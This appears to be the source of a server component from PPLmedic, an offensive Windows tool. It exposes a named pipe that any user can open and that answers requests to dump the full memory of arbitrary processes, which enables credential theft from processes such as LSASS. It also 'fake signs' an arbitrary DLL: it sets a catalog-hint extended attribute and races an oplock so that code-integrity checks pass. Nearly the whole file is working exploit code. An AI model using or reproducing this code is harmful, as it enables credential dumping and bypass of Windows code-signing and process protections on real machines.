#include "Server.h"
#include "common.h"
#include "..\PPLmedic\ntstuff.h"
#include <sddl.h>
#include <strsafe.h>
#include <Dbghelp.h>
#include <shlwapi.h>

#pragma comment(lib, "Dbghelp.lib")
#pragma comment(lib, "Shlwapi.lib")

Server::Server(LPCWSTR PipeName)
{
    this->_PipeName = PipeName;
    this->_PipeHandle = INVALID_HANDLE_VALUE;
    this->_PipeConnected = FALSE;
    this->_PipeRequest = (LPBYTE)LocalAlloc(LPTR, PAGE_SIZE);
    this->_PipeResponse = (LPBYTE)LocalAlloc(LPTR, PAGE_SIZE);
}

Server::~Server()
{
    if (this->_PipeHandle != INVALID_HANDLE_VALUE)
    {
        if (this->_PipeConnected)
            DisconnectNamedPipe(this->_PipeHandle);

        CloseHandle(this->_PipeHandle);
    }

    if (this->_PipeRequest) LocalFree(this->_PipeRequest);
    if (this->_PipeResponse) LocalFree(this->_PipeResponse);
}

BOOL Server::Create()
{
    return (this->_PipeHandle = Server::CreateCustomNamedPipe(this->_PipeName, FALSE)) != INVALID_HANDLE_VALUE;
}

BOOL Server::Listen()
{
    BOOL bResult = FALSE, bClientConnected = FALSE;
    DWORD dwBytesRead, dwBytesWritten, dwResponseSize;

    EXIT_ON_ERROR(!this->_PipeRequest || !this->_PipeResponse);
    EXIT_ON_ERROR(!(bClientConnected = ConnectNamedPipe(this->_PipeHandle, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED)));

    DEBUG(L"Client connected.");

    while (true)
    {
        ZeroMemory(this->_PipeRequest, PAGE_SIZE);
        ZeroMemory(this->_PipeResponse, PAGE_SIZE);

        if (!ReadFile(this->_PipeHandle, this->_PipeRequest, PAGE_SIZE, &dwBytesRead, NULL) || dwBytesRead == 0)
        {
            DEBUG(L"ReadFile error: 0x%08x (%d)", GetLastError(), GetLastError());
            break;
        }

        if (!ProcessRequest(this->_PipeRequest, this->_PipeResponse, &dwResponseSize))
        {
            DEBUG(L"Fail to process request.");
            break;
        }

        if (!WriteFile(this->_PipeHandle, this->_PipeResponse, dwResponseSize, &dwBytesWritten, NULL) || dwBytesWritten != dwResponseSize)
        {
            DEBUG(L"WriteFile error: 0x%08x (%d)", GetLastError(), GetLastError());
            break;
        }

        if (!FlushFileBuffers(this->_PipeHandle))
        {
            DEBUG(L"FlushFileBuffers error: 0x%08x (%d)", GetLastError(), GetLastError());
            break;
        }

        bResult = TRUE;
    }

cleanup:
    DEBUG(L"LE: %d | Result: %d", LAST_ERROR(bResult), bResult);

    if (bClientConnected && this->_PipeHandle != INVALID_HANDLE_VALUE)
        DisconnectNamedPipe(this->_PipeHandle);

    return bResult;
}

HANDLE Server::CreateCustomNamedPipe(LPCWSTR PipeName, BOOL Async)
{
    BOOL bResult = FALSE;
    LPWSTR pwszPipeName = NULL;
    SECURITY_DESCRIPTOR sd;
    SECURITY_ATTRIBUTES sa;
    HANDLE hPipe = INVALID_HANDLE_VALUE;
    DWORD dwOpenMode, dwPipeMode,dwMaxInstances;

    EXIT_ON_ERROR(!(pwszPipeName = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR))));
    EXIT_ON_ERROR(!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION));
    EXIT_ON_ERROR(!ConvertStringSecurityDescriptorToSecurityDescriptorW(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &((&sa)->lpSecurityDescriptor), NULL));

    swprintf_s(pwszPipeName, MAX_PATH, L"\\\\.\\pipe\\%ws", PipeName);

    dwOpenMode = PIPE_ACCESS_DUPLEX | (Async ? FILE_FLAG_OVERLAPPED : 0);
    dwPipeMode = PIPE_TYPE_BYTE | PIPE_WAIT;
    dwMaxInstances = PIPE_UNLIMITED_INSTANCES;

    EXIT_ON_ERROR((hPipe = CreateNamedPipeW(pwszPipeName, dwOpenMode, dwPipeMode, dwMaxInstances, PAGE_SIZE, PAGE_SIZE, 0, &sa)) == INVALID_HANDLE_VALUE);

    bResult = TRUE;

cleanup:
    DEBUG(L"Pipe: %ws | LE: %d | Handle: %d", pwszPipeName, LAST_ERROR(bResult), HandleToULong(hPipe));

    if (pwszPipeName) LocalFree(pwszPipeName);

    return hPipe;
}

BOOL Server::PrivilegeCheckByName(LPCWSTR PrivilegeName, PBOOL PrivilegeHeld)
{
    BOOL bResult = FALSE, bPrivilegeHeld = FALSE;
    HANDLE hToken = NULL;
    LUID PrivilegeRequired;
    PRIVILEGE_SET set;
    LUID_AND_ATTRIBUTES lua;

    EXIT_ON_ERROR(!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken));
    EXIT_ON_ERROR(!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &PrivilegeRequired));

    ZeroMemory(&lua, sizeof(lua));
    lua.Luid = PrivilegeRequired;
    lua.Attributes = SE_PRIVILEGE_ENABLED | SE_PRIVILEGE_ENABLED_BY_DEFAULT;

    ZeroMemory(&set, sizeof(set));
    set.PrivilegeCount = 1;
    set.Control = PRIVILEGE_SET_ALL_NECESSARY;
    set.Privilege[0] = lua;

    EXIT_ON_ERROR(!PrivilegeCheck(hToken, &set, &bPrivilegeHeld));

    bResult = TRUE;
    *PrivilegeHeld = bPrivilegeHeld;

cleanup:
    if (hToken) CloseHandle(hToken);

    return bResult;
}

BOOL Server::GetInitialLogonSessionToken(PHANDLE Token)
{
    BOOL bResult = FALSE, bImpersonation = FALSE;
    HANDLE hPipeServer = INVALID_HANDLE_VALUE, hPipeClient = INVALID_HANDLE_VALUE, hPipeEvent = NULL, hToken = NULL, hTokenDup = NULL;
    LPWSTR pwszPipePathClient = NULL;
    OVERLAPPED o;

    EXIT_ON_ERROR(!(pwszPipePathClient = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR))));
    EXIT_ON_ERROR((hPipeServer = Server::CreateCustomNamedPipe(STR_DUMMY_PIPE_NAME, TRUE)) == INVALID_HANDLE_VALUE);

    swprintf_s(pwszPipePathClient, MAX_PATH, L"\\\\localhost\\pipe\\%ws", STR_DUMMY_PIPE_NAME);

    EXIT_ON_ERROR(!(hPipeEvent = CreateEventW(NULL, TRUE, FALSE, NULL)));

    ZeroMemory(&o, sizeof(o));
    o.hEvent = hPipeEvent;

    EXIT_ON_ERROR(!ConnectNamedPipe(hPipeServer, &o) && GetLastError() != ERROR_IO_PENDING);
    EXIT_ON_ERROR((hPipeClient = CreateFileW(pwszPipePathClient, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL)) == INVALID_HANDLE_VALUE);
    EXIT_ON_ERROR(!ImpersonateNamedPipeClient(hPipeServer));

    bImpersonation = TRUE;

    EXIT_ON_ERROR(!OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, FALSE, &hToken));
    EXIT_ON_ERROR(!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &hTokenDup));
    
    *Token = hTokenDup;
    bResult = TRUE;

cleanup:
    DEBUG(L"Handle: 0x%04x | LE: %d | Result: %d", HandleToULong(hTokenDup), LAST_ERROR(bResult), bResult);

    if (bImpersonation) RevertToSelf();
    if (hToken) CloseHandle(hToken);
    if (hPipeClient && hPipeClient != INVALID_HANDLE_VALUE) CloseHandle(hPipeClient);
    if (hPipeEvent) CloseHandle(hPipeEvent);
    if (hPipeServer && hPipeServer != INVALID_HANDLE_VALUE) CloseHandle(hPipeServer);
    if (pwszPipePathClient) LocalFree(pwszPipePathClient);

    return bResult;
}

BOOL Server::FindCatalogFile(LPWSTR* FilePath)
{
    BOOL bResult = FALSE;
    LPWSTR pwszSearchPath = NULL, pwszFilePath = NULL;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    WIN32_FIND_DATAW wfd;

    EXIT_ON_ERROR(!(pwszSearchPath = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR))));
    EXIT_ON_ERROR(!(pwszFilePath = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR))));
    EXIT_ON_ERROR(!GetSystemDirectoryW(pwszFilePath, MAX_PATH));

    wcscat_s(pwszFilePath, MAX_PATH, L"\\CatRoot\\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}");
    swprintf_s(pwszSearchPath, MAX_PATH, L"%ws\\Adobe-*.cat", pwszFilePath);

    if ((hFind = FindFirstFileW(pwszSearchPath, &wfd)) == INVALID_HANDLE_VALUE)
    {
        swprintf_s(pwszSearchPath, MAX_PATH, L"%ws\\WindowsSearchEngineSKU-*.cat", pwszFilePath);

        EXIT_ON_ERROR((hFind = FindFirstFileW(pwszSearchPath, &wfd)) == INVALID_HANDLE_VALUE);
    }

    swprintf_s(pwszFilePath, MAX_PATH, L"%ws\\%ws", pwszFilePath, wfd.cFileName);

    *FilePath = pwszFilePath;
    bResult = TRUE;

cleanup:
    DEBUG(L"File path: %ws | Search path: %ws | Result: %d", pwszFilePath, pwszSearchPath, bResult);

    if (hFind && hFind != INVALID_HANDLE_VALUE) FindClose(hFind);
    if (pwszSearchPath) LocalFree(pwszSearchPath);
    if (!bResult && pwszFilePath) LocalFree(pwszFilePath);

    return bResult;
}

BOOL Server::SetFileCatalogHint(HANDLE FileHandle, LPWSTR CatalogPath)
{
    BOOL bResult = FALSE;
    PFILE_FULL_EA_INFORMATION FileInfo = NULL;
    LPCSTR pszEaName = "$CI.CATALOGHINT";
    LPWSTR pwszCatalogFilename;
    CHAR CatalogFilename[MAX_PATH];
    USHORT uSize, i;
    LPBYTE pBufferIndex;
    IO_STATUS_BLOCK iob;
    NTSTATUS status = STATUS_SUCCESS;

    EXIT_ON_ERROR(!(FileInfo = (PFILE_FULL_EA_INFORMATION)LocalAlloc(LPTR, 1024)));
    EXIT_ON_ERROR((pwszCatalogFilename = PathFindFileNameW(CatalogPath)) == CatalogPath);

    //
    // Convert the UNICODE filename to an array of chars. We assume the filename
    // contains only UTF-8 characters.
    //

    for (i = 0; i < wcslen(pwszCatalogFilename); i++)
    {
        CatalogFilename[i] = (CHAR)pwszCatalogFilename[i];
    }
    CatalogFilename[i] = '\0';

    //
    // Populate the FILE_FULL_EA_INFORMATION structure
    //

    FileInfo->NextEntryOffset = 0;
    FileInfo->Flags = 0;
    FileInfo->EaNameLength = (UCHAR)strlen(pszEaName); // Length of the EA entry name (it does not include the NUL terminator).
    FileInfo->EaValueLength = (USHORT)(2 * sizeof(uSize) + strlen(CatalogFilename));
    memcpy(FileInfo->EaName, pszEaName, strlen(pszEaName) + 1); // Write the name of the EA attribute (UTF-8), including the NUL terminator

    //
    // Sample EA buffer for a Catalog Hint (ntdll.dll):
    //   01 00  <- ???
    //   61 00  <- Length of the catalog filename
    //   4D 69 63 72 6F ...  <- Filename of the catalog file (e.g.: Microsoft-Windows-Client-Desktop-Required-Package0516~31bf3856ad364e35~amd64~~10.0.19041.2364.cat)
    //

    pBufferIndex = (LPBYTE)(FileInfo->EaName + FileInfo->EaNameLength + 1); // Start of the EA entry
    uSize = 1;
    memcpy(pBufferIndex, &uSize, sizeof(uSize));

    pBufferIndex = pBufferIndex + sizeof(uSize); // We wrote the first short value, increment the pointer past it
    uSize = (USHORT)strlen(CatalogFilename); // The next value is the length of the Catalog filename
    memcpy(pBufferIndex, &uSize, sizeof(uSize));

    pBufferIndex = pBufferIndex + sizeof(uSize); // We wrote the second short value, increment the pointer past it
    memcpy(pBufferIndex, CatalogFilename, strlen(CatalogFilename) + 1);

    uSize = (USHORT)((strlen(pszEaName) + (2 * sizeof(uSize) + strlen(CatalogFilename)) + 9 + 3) & ~3);

    EXIT_ON_ERROR(!NT_SUCCESS(status = NtSetEaFile(FileHandle, &iob, FileInfo, uSize)));

    bResult = TRUE;

cleanup:
    DEBUG(L"LE: %d | Result: %d", LAST_ERROR(bResult), bResult);

    if (!NT_SUCCESS(status)) SetLastError(RtlNtStatusToDosError(status));
    if (FileInfo) LocalFree(FileInfo);

    return bResult;
}

BOOL Server::SetFileOpLock(LPWSTR FilePath, PHANDLE FileHandle, PHANDLE LockEvent)
{
    BOOL bResult = FALSE;
    HANDLE hFile = NULL, hEvent = NULL;
    OVERLAPPED o;
    DWORD dwBytesReturned;

    EXIT_ON_ERROR(!(hEvent = CreateEventW(NULL, FALSE, FALSE, NULL)));
    EXIT_ON_ERROR((hFile = CreateFileW(FilePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL)) == INVALID_HANDLE_VALUE);

    ZeroMemory(&o, sizeof(o));
    o.hEvent = hEvent;

    if (!DeviceIoControl(hFile, FSCTL_REQUEST_OPLOCK_LEVEL_1, NULL, 0, NULL, 0, &dwBytesReturned, &o))
    {
        EXIT_ON_ERROR(GetLastError() != ERROR_IO_PENDING);
    }

    *FileHandle = hFile;
    *LockEvent = hEvent;
    bResult = TRUE;

cleanup:
    DEBUG(L"LE: %d | Result: %d", LAST_ERROR(bResult), bResult);

    if (!bResult && hEvent) CloseHandle(hEvent);
    if (!bResult && hFile) CloseHandle(hFile);

    return bResult;
}

BOOL Server::GetFileSigningLevel(HANDLE FileHandle, PDWORD SigningLevel)
{
    BOOL bResult = FALSE;
    DWORD dwFlags = 0xffffffff;
    SE_SIGNING_LEVEL Level = 0;
    NTSTATUS status = 0;

    EXIT_ON_ERROR(!NT_SUCCESS(status = NtGetCachedSigningLevel(FileHandle, &dwFlags, &Level, NULL, NULL, NULL)));

    *SigningLevel = Level;
    bResult = TRUE;

cleanup:
    if (!NT_SUCCESS(status)) SetLastError(RtlNtStatusToDosError(status));

    DEBUG(L"Flags: 0x%08x | Signing level: %d | LE: %d | Result: %d", dwFlags, Level, LAST_ERROR(bResult), bResult);

    return bResult;
}

DWORD WINAPI Server::CreateSectionThread(LPVOID Parameter)
{
    BOOL bResult = FALSE;
    HANDLE hFile = *(PHANDLE)Parameter;
    LPWSTR pwszFilePath = NULL, pwszFileName, pwszSectionPath = NULL;
    HANDLE hDummySection = NULL;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING us;
    NTSTATUS status = STATUS_SUCCESS;

    EXIT_ON_ERROR(!(pwszFilePath = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR))));
    EXIT_ON_ERROR(!(pwszSectionPath = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR))));
    EXIT_ON_ERROR(!GetFinalPathNameByHandleW(hFile, pwszFilePath, MAX_PATH, FILE_NAME_NORMALIZED | VOLUME_NAME_DOS));
    EXIT_ON_ERROR((pwszFileName = PathFindFileNameW(pwszFilePath)) == pwszFilePath);

    swprintf_s(pwszSectionPath, MAX_PATH, L"\\BaseNamedObjects\\%ws", pwszFileName);

    ZeroMemory(&oa, sizeof(oa));
    oa.Length = sizeof(oa);

    RtlInitUnicodeString(&us, pwszSectionPath);
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);

    EXIT_ON_ERROR(!NT_SUCCESS(status = NtCreateSection(&hDummySection, SECTION_ALL_ACCESS, &oa, NULL, PAGE_READONLY, SEC_IMAGE, hFile)));

    bResult = TRUE;

cleanup:
    if (!NT_SUCCESS(status)) SetLastError(RtlNtStatusToDosError(status));

    DEBUG(L"Section path: %ws | LE: %d | Result: %d", pwszSectionPath, LAST_ERROR(bResult), bResult);

    if (hDummySection) CloseHandle(hDummySection);
    if (pwszFilePath) LocalFree(pwszFilePath);
    if (pwszSectionPath) LocalFree(pwszSectionPath);

    return 0;
}

BOOL Server::ProcessRequest(LPBYTE Request, LPBYTE Response, PDWORD ResponseSize)
{
    BOOL bResult = TRUE;
    MessageType type;

    type = ((PMSG_REQUEST)Request)->Type;
    *ResponseSize = sizeof(MSG_RESPONSE);

    DEBUG(L"Processing request of type: %d", type);

    switch (type)
    {
    case MessageType::DoGetProtectionLevel:
        DoGetProtectionLevel((PMSG_REQUEST)Request, (PMSG_RESPONSE)Response);
        break;
    case MessageType::DoDumpProcess:
        DoDumpProcessMemory((PMSG_REQUEST)Request, (PMSG_RESPONSE)Response);
        break;
    case MessageType::DoFakeSignDll:
        DoFakeSignDll((PMSG_REQUEST)Request, (PMSG_RESPONSE)Response);
        break;
    default:
        bResult = FALSE;
    }

    DEBUG(L"Result: %d", bResult);

    return bResult;
}

BOOL Server::DoGetProtectionLevel(PMSG_REQUEST Request, PMSG_RESPONSE Response)
{
    BOOL bResult = FALSE;
    PROCESS_PROTECTION_LEVEL_INFORMATION Protection = { 0xffffffff };

    EXIT_ON_ERROR(!GetProcessInformation(GetCurrentProcess(), ProcessProtectionLevelInfo, &Protection, sizeof(Protection)));

    Response->p.ProtectionLevel.Level = Protection.ProtectionLevel;
    bResult = TRUE;

cleanup:
    Response->Type = MessageType::DoGetProtectionLevel;
    Response->Result = bResult;
    Response->LastError = LAST_ERROR(bResult);

    DEBUG(L"Protection level: 0x%08x | LE: %d | Result: %d", Protection.ProtectionLevel, LAST_ERROR(bResult), Response->Result);

    return bResult;
}

BOOL Server::DoDumpProcessMemory(PMSG_REQUEST Request, PMSG_RESPONSE Response)
{
    BOOL bResult = FALSE, bDebugPriv = FALSE, bFileCreated = FALSE, bImpersonation = FALSE;
    DWORD dwProcessId = Request->p.DumpProcess.Pid;
    LPWSTR pwszDumpFilePath = Request->p.DumpProcess.OutputFilePath;
    HANDLE hToken = NULL, hCurrentThread = GetCurrentThread(), hFile = INVALID_HANDLE_VALUE, hProcess = NULL;

    EXIT_ON_ERROR(!Server::PrivilegeCheckByName(SE_DEBUG_NAME, &bDebugPriv));

    if (!bDebugPriv)
    {
        EXIT_ON_ERROR(!Server::GetInitialLogonSessionToken(&hToken));
        EXIT_ON_ERROR(!SetThreadToken(&hCurrentThread, hToken));
        bImpersonation = TRUE;
    }

    EXIT_ON_ERROR((hFile = CreateFileW(pwszDumpFilePath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE);
    
    bFileCreated = TRUE;
    
    EXIT_ON_ERROR(!(hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcessId)));
    EXIT_ON_ERROR(!MiniDumpWriteDump(hProcess, dwProcessId, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL));

    bResult = TRUE;

cleanup:
    Response->Type = MessageType::DoDumpProcess;
    Response->Result = bResult;
    Response->LastError = LAST_ERROR(bResult);

    DEBUG(L"Dump file: %ws | Handle: 0x%04x | LE: %d | Result: %d", pwszDumpFilePath, HandleToULong(hFile), LAST_ERROR(bResult), bResult);

    if (bImpersonation) RevertToSelf();
    if (hProcess) CloseHandle(hProcess);
    if (hFile && hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    if (!bResult && bFileCreated) DeleteFileW(pwszDumpFilePath);

    return bResult;
}

BOOL Server::DoFakeSignDll(PMSG_REQUEST Request, PMSG_RESPONSE Response)
{
    BOOL bResult = FALSE, bOutputFileCreated = FALSE;
    LPWSTR pwszInputFilePath, pwszOutputFilePath, pwszLegitFilePath = NULL, pwszCatalogFilePath = NULL;
    HANDLE hInputFile = INVALID_HANDLE_VALUE, hOutputFile = INVALID_HANDLE_VALUE, hLockedFile = NULL, hLockedFileEvent = NULL, hThread = NULL;
    DWORD dwNumberOfBytesRead, dwNumberOfBytesWritten, dwSigningLevel = 0;
    LPBYTE pBuffer = NULL;
    const DWORD dwBufferSize = 0x10000;

    pwszInputFilePath = Request->p.FakeSignDll.InputFilePath;
    pwszOutputFilePath = Request->p.FakeSignDll.OutputFilePath;

    EXIT_ON_ERROR(!(pwszLegitFilePath = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR))));
    EXIT_ON_ERROR(!GetSystemDirectoryW(pwszLegitFilePath, MAX_PATH));

    swprintf_s(pwszLegitFilePath, MAX_PATH, L"%ws\\%ws", pwszLegitFilePath, STR_SIGNED_SYSTEM_DLL);

    EXIT_ON_ERROR(!Server::FindCatalogFile(&pwszCatalogFilePath));
    EXIT_ON_ERROR(!(pBuffer = (LPBYTE)LocalAlloc(LPTR, dwBufferSize)));
    EXIT_ON_ERROR((hInputFile = CreateFileW(pwszInputFilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE);
    EXIT_ON_ERROR(!CopyFileW(pwszLegitFilePath, pwszOutputFilePath, TRUE));

    bOutputFileCreated = TRUE;

    EXIT_ON_ERROR((hOutputFile = CreateFileW(pwszOutputFilePath, MAXIMUM_ALLOWED, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE);
    EXIT_ON_ERROR(!Server::SetFileCatalogHint(hOutputFile, pwszCatalogFilePath));

    DEBUG(L"Catalog hint '%ws' set on: %ws", pwszCatalogFilePath, pwszOutputFilePath);

    EXIT_ON_ERROR(!Server::SetFileOpLock(pwszCatalogFilePath, &hLockedFile, &hLockedFileEvent));

    DEBUG(L"Oplock set on: %ws", pwszCatalogFilePath);

    EXIT_ON_ERROR(!(hThread = CreateThread(NULL, 0, Server::CreateSectionThread, &hOutputFile, 0, NULL)));
    EXIT_ON_ERROR(WaitForSingleObject(hLockedFileEvent, TIMEOUT) != WAIT_OBJECT_0);

    DEBUG(L"Oplock triggerred.");

    do
    {
        if (!ReadFile(hInputFile, pBuffer, dwBufferSize, &dwNumberOfBytesRead, NULL))
            break;

        if (!WriteFile(hOutputFile, pBuffer, dwNumberOfBytesRead, &dwNumberOfBytesWritten, NULL))
            break;

    } while (dwNumberOfBytesRead == dwBufferSize);

    DEBUG(L"Replaced target file content, releasing oplock...");

    CloseHandle(hLockedFile);
    hLockedFile = NULL;

    WaitForSingleObject(hThread, TIMEOUT);

    EXIT_ON_ERROR(!GetFileSigningLevel(hOutputFile, &dwSigningLevel));

    bResult = TRUE;

cleanup:
    Response->Type = MessageType::DoFakeSignDll;
    Response->Result = bResult;
    Response->LastError = LAST_ERROR(bResult);
    Response->p.SigningLevel.Level = dwSigningLevel;

    DEBUG(L"LE: %d | Result: %d", LAST_ERROR(bResult), bResult);

    if (hThread) CloseHandle(hThread);
    if (hLockedFile) CloseHandle(hLockedFile);
    if (hLockedFileEvent) CloseHandle(hLockedFileEvent);
    if (hOutputFile && hOutputFile != INVALID_HANDLE_VALUE) CloseHandle(hOutputFile);
    if (hInputFile && hInputFile != INVALID_HANDLE_VALUE) CloseHandle(hInputFile);
    if (!bResult && bOutputFileCreated) DeleteFileW(pwszLegitFilePath);
    if (pwszLegitFilePath) LocalFree(pwszLegitFilePath);
    if (pBuffer) LocalFree(pBuffer);
    if (pwszCatalogFilePath) LocalFree(pwszCatalogFilePath);
    
    return bResult;
}
